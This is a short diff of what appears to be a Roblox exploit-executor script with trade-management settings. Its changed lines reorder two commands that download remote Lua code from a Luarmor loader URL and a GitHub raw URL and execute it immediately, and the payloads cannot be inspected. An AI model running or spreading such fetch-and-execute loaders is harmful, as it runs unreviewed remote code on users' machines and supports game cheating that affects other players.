@@ -39,7 +39,7 @@ _G.TradeManage = {
         }
     }
 }
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/64146f41d4c3ead8fb6d71339ef0c7c2.lua"))()
 getgenv().YourScript = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/0xztnes/testsc/refs/heads/main/LOAD1"))()
 end
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/64146f41d4c3ead8fb6d71339ef0c7c2.lua"))()
